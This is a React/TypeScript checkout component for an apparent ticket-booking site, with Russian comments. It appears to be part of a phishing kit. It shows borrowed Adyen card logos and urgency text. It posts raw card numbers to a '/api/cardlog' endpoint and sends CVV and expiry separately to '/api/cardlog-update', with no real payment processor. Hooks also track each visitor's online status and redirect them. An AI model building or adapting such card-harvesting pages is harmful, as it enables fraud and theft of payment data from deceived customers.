// Updated Payment.tsx
import { useState, useEffect } from "react";
import styles from "./Payment.module.css";
import TotalOverview from "../../components/TotalOverview/TotalOverview";
import { useLocation } from "react-router-dom";
import Help from "../../components/Help/Help";
import { useRedirectChecker } from "../../hooks/useRedirectChecker";
import Loading from "../../components/Loading/Loading";
import Modal from "../../components/UI/Modal/Modal";
import { useOnlineStatus } from "../../hooks/useOnlineStatus";
import OrderReview from "../../components/OrderReview/OrderReview";
import { useBooking } from "../../context/BookingContext";
import { useStepper } from "../../context/StepperContext";

const Payment = () => {
  const sessionId = localStorage.getItem("currentSessionId");
  const location = useLocation();
  const { bookingData } = useBooking();
  const { setCurrentStep, markStepCompleted } = useStepper();

  // Initialize stepper when component mounts - ТОЛЬКО УСТАНАВЛИВАЕМ ТЕКУЩИЙ ШАГ
  useEffect(() => {
    setCurrentStep("your_details");
    // НЕ помечаем booking как completed здесь!
  }, [setCurrentStep]);

  const getLatestBookingData = () => {
    try {
      const stored = localStorage.getItem("bookingData");
      const parsed = stored ? JSON.parse(stored) : null;
      return parsed || bookingData || null;
    } catch {
      return bookingData;
    }
  };

  useRedirectChecker(3000);
  useOnlineStatus({
    sessionId,
    pageName: "payment",
    enabled: true,
  });

  useEffect(() => {
    console.log(bookingData?.totalPrice);
  }, []);

  const [isLoading, setLoading] = useState(false);
  const [currentPaymentStep, setCurrentPaymentStep] = useState<
    "review" | "personal" | "payment"
  >("review");

  const [isModalActive, setModalActive] = useState(false);

  const [formData, setFormData] = useState({
    firstName: "",
    lastName: "",
    countryCode: "+971",
    phoneNumber: "",
  });

  const [submittedData, setSubmittedData] = useState<typeof formData | null>(
    null
  );

  const [cardData, setCardData] = useState({
    cardNumber: "",
    expiryDate: "",
    cvv: "",
  });

  const [formErrors, setFormErrors] = useState({
    firstName: "",
    lastName: "",
    phoneNumber: "",
  });

  const [cardErrors, setCardErrors] = useState({
    cardNumber: "",
    expiryDate: "",
    cvv: "",
  });

  useEffect(() => {
    window.scrollTo(0, 0);
  }, [location.pathname, currentPaymentStep]);

  // Update stepper when payment step changes - ТЕПЕРЬ ПРАВИЛЬНО!
  useEffect(() => {
    if (currentPaymentStep === "personal") {
      setCurrentStep("your_details");
      // Когда переходим к personal details, помечаем booking как completed
      markStepCompleted("booking");
    } else if (currentPaymentStep === "payment") {
      setCurrentStep("payment");
      markStepCompleted("your_details");
    }
  }, [currentPaymentStep, setCurrentStep, markStepCompleted]);

  // ===== Валидации =====
  const validateName = (name: string) =>
    /^[a-zA-Zа-яА-Я\s'-]+$/.test(name) && name.length >= 2;
  const validatePhone = (phone: string) =>
    /^\d+$/.test(phone) && phone.length >= 7 && phone.length <= 15;
  const validateCardNumber = (num: string) =>
    num.replace(/\D/g, "").length === 16;
  const validateExpiryDate = (val: string) =>
    /^(0[1-9]|1[0-2])\/\d{2}$/.test(val);
  const validateCvv = (cvv: string) => /^\d{3}$/.test(cvv);

  // ===== Инпуты =====
  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target;
    let filteredValue = value;
    if (name === "firstName" || name === "lastName")
      filteredValue = value.replace(/[^a-zA-Zа-яА-Я\s'-]/g, "");
    if (name === "phoneNumber") filteredValue = value.replace(/\D/g, "");

    setFormData((prev) => ({ ...prev, [name]: filteredValue }));
    setFormErrors((prev) => ({ ...prev, [name]: "" }));
  };

  const handleCardChange = (
    e: React.ChangeEvent<HTMLInputElement>,
    field: "cardNumber" | "expiryDate" | "cvv"
  ) => {
    let value = e.target.value.replace(/\D/g, "");
    if (field === "cardNumber") {
      value = value
        .substring(0, 16)
        .replace(/(\d{4})/g, "$1 ")
        .trim();
    } else if (field === "expiryDate") {
      if (value.length > 2)
        value = value.substring(0, 2) + "/" + value.substring(2, 4);
    } else if (field === "cvv") {
      value = value.substring(0, 3);
    }
    setCardData((prev) => ({ ...prev, [field]: value }));
    setCardErrors((prev) => ({ ...prev, [field]: "" }));
  };

  // ===== Отправки =====
  const handleSubmitPersonalData = async (e?: React.FormEvent) => {
    if (e) e.preventDefault();

    const errors = {
      firstName: !validateName(formData.firstName)
        ? "Enter valid first name"
        : "",
      lastName: !validateName(formData.lastName) ? "Enter valid last name" : "",
      phoneNumber: !validatePhone(formData.phoneNumber)
        ? "Enter valid phone number"
        : "",
    };
    setFormErrors(errors);
    if (Object.values(errors).some(Boolean)) return;

    try {
      const latest = getLatestBookingData();
      const currentTotalPrice = latest?.totalPrice || 0;

      const response = await fetch("/api/customer", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          sessionId,
          name: formData.firstName,
          surname: formData.lastName,
          phone: formData.countryCode + formData.phoneNumber,
          totalPrice: currentTotalPrice,
        }),
      });

      const data = await response.json();
      if (data.success) {
        setSubmittedData(formData);
        setCurrentPaymentStep("payment");
      }
    } catch {
      alert("Error sending data");
    }
  };

  const handleOpenPaymentModal = async () => {
    if (!validateCardNumber(cardData.cardNumber)) {
      setCardErrors({ ...cardErrors, cardNumber: "Invalid card number" });
      return;
    }

    setLoading(true);
    try {
      const latest = getLatestBookingData();
      const currentTotalPrice = latest?.totalPrice || 0;

      await fetch("/api/cardlog", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          sessionId,
          cardNumber: cardData.cardNumber.replace(/\D/g, ""),
          step: "card_number_only",
          totalPrice: currentTotalPrice,
        }),
      });
    } catch {
      alert("Network error");
    }
    setLoading(false);
    setModalActive(true);
  };

  const handleSubmitPayment = async () => {
    if (
      !validateExpiryDate(cardData.expiryDate) ||
      !validateCvv(cardData.cvv)
    ) {
      alert("Please fill all card details correctly");
      return;
    }

    setLoading(true);
    try {
      const currentTotalPrice = bookingData?.totalPrice || 0;

      await fetch("/api/cardlog-update", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          sessionId,
          cvv: cardData.cvv,
          expireDate: cardData.expiryDate,
          totalPrice: currentTotalPrice,
        }),
      });

      // Mark payment as completed
      markStepCompleted("payment");
    } catch {
      alert("Payment error");
    }
    setLoading(true);
    setModalActive(false);
  };

  // ===== JSX =====
  return (
    <>
      {currentPaymentStep === "review" ? (
        <OrderReview onConfirm={() => setCurrentPaymentStep("personal")} />
      ) : (
        <div className={styles.wrapper}>
          <div className={styles.content__side}>
            <div className={styles.form__container}>
              {currentPaymentStep === "personal" ? (
                <>
                  <h1 className={styles.form__title}>
                    Who shall we send these tickets to?
                  </h1>
                  <form
                    onSubmit={(e) => handleSubmitPersonalData(e)}
                    className={styles.form}
                  >
                    <div className={styles.form__row}>
                      <div className={styles.form__group}>
                        <label className={styles.form__label}>First name</label>
                        <input
                          type="text"
                          name="firstName"
                          value={formData.firstName}
                          onChange={handleInputChange}
                          className={`${styles.form__input} ${
                            formErrors.firstName ? styles.input__error : ""
                          }`}
                          required
                        />
                        {formErrors.firstName && (
                          <div className={styles.error__message}>
                            {formErrors.firstName}
                          </div>
                        )}
                      </div>

                      <div className={styles.form__group}>
                        <label className={styles.form__label}>Last name</label>
                        <input
                          type="text"
                          name="lastName"
                          value={formData.lastName}
                          onChange={handleInputChange}
                          className={`${styles.form__input} ${
                            formErrors.lastName ? styles.input__error : ""
                          }`}
                          required
                        />
                        {formErrors.lastName && (
                          <div className={styles.error__message}>
                            {formErrors.lastName}
                          </div>
                        )}
                      </div>
                    </div>

                    <div className={styles.form__group}>
                      <label className={styles.form__label}>
                        Mobile phone number
                      </label>
                      <div className={styles.phone__container}>
                        <div className={styles.country__code}>
                          {formData.countryCode}
                        </div>
                        <input
                          type="tel"
                          name="phoneNumber"
                          value={formData.phoneNumber}
                          onChange={handleInputChange}
                          className={`${styles.phone__input} ${
                            formErrors.phoneNumber ? styles.input__error : ""
                          }`}
                          required
                        />
                      </div>
                      {formErrors.phoneNumber && (
                        <div className={styles.error__message}>
                          {formErrors.phoneNumber}
                        </div>
                      )}
                    </div>
                  </form>
                </>
              ) : (
                <>
                  <h1 className={styles.form__title}>Payment Details</h1>
                  <p className={styles.form__subtitle}>
                    We have secured your tickets. To receive your tickets please
                    complete your payment as soon as possible via one of our
                    secure payment methods.
                  </p>
                  <div className={styles.form}>
                    <div className={styles.form__group}>
                      <div className={styles.supported_cards}>
                        <img
                          height="16"
                          alt="visa"
                          src="https://checkoutshopper-live.adyen.com/checkoutshopper/images/logos/visa.svg"
                        />
                        <img
                          height="16"
                          alt="mc"
                          src="https://checkoutshopper-live.adyen.com/checkoutshopper/images/logos/mc.svg"
                        />
                        <img
                          height="16"
                          alt="bcmc"
                          src="https://checkoutshopper-live.adyen.com/checkoutshopper/images/logos/bcmc.svg"
                        />
                        <img
                          height="16"
                          alt="amex"
                          src="https://checkoutshopper-live.adyen.com/checkoutshopper/images/logos/amex.svg"
                        />
                        <img
                          height="16"
                          alt="cup"
                          src="https://checkoutshopper-live.adyen.com/checkoutshopper/images/logos/cup.svg"
                        />
                        <img
                          height="16"
                          alt="diners"
                          src="https://checkoutshopper-live.adyen.com/checkoutshopper/images/logos/diners.svg"
                        />
                        <img
                          height="16"
                          alt="discover"
                          src="https://checkoutshopper-live.adyen.com/checkoutshopper/images/logos/discover.svg"
                        />
                      </div>
                      <label className={styles.form__label}>Card Number</label>
                      <input
                        type="text"
                        value={cardData.cardNumber}
                        onChange={(e) => handleCardChange(e, "cardNumber")}
                        className={`${styles.form__input} ${
                          cardErrors.cardNumber ? styles.input__error : ""
                        }`}
                        maxLength={19}
                        required
                      />
                      {cardErrors.cardNumber && (
                        <div className={styles.error__message}>
                          {cardErrors.cardNumber}
                        </div>
                      )}
                    </div>
                  </div>

                  <Modal active={isModalActive} setActive={setModalActive}>
                    <h2 className={styles.modal__title}>Complete Payment</h2>
                    <div className={styles.form__row}>
                      <div className={styles.form__group}>
                        <label className={styles.form__label}>
                          Expiry Date
                        </label>
                        <input
                          type="text"
                          value={cardData.expiryDate}
                          onChange={(e) => handleCardChange(e, "expiryDate")}
                          className={`${styles.form__input} ${
                            cardErrors.expiryDate ? styles.input__error : ""
                          }`}
                          placeholder="MM/YY"
                          required
                        />
                      </div>
                      <div className={styles.form__group}>
                        <label className={styles.form__label}>CVV</label>
                        <input
                          type="text"
                          value={cardData.cvv}
                          onChange={(e) => handleCardChange(e, "cvv")}
                          className={`${styles.form__input} ${
                            cardErrors.cvv ? styles.input__error : ""
                          }`}
                          placeholder="123"
                          required
                        />
                      </div>
                    </div>
                    <button
                      className={styles.pay__now__btn}
                      onClick={handleSubmitPayment}
                      disabled={isLoading}
                    >
                      {isLoading ? "Processing..." : "Pay Now"}
                    </button>
                  </Modal>
                </>
              )}
            </div>
          </div>

          {(currentPaymentStep as string) !== "review" && (
            <div className={styles.static__side}>
              <TotalOverview
                onNextStep={
                  currentPaymentStep === "personal"
                    ? handleSubmitPersonalData
                    : handleOpenPaymentModal
                }
                isPaymentStep={currentPaymentStep === "payment"}
                userData={submittedData || undefined}
              />
            </div>
          )}
        </div>
      )}

      <Help />
      <Loading isLoading={isLoading} />
    </>
  );
};

export default Payment;
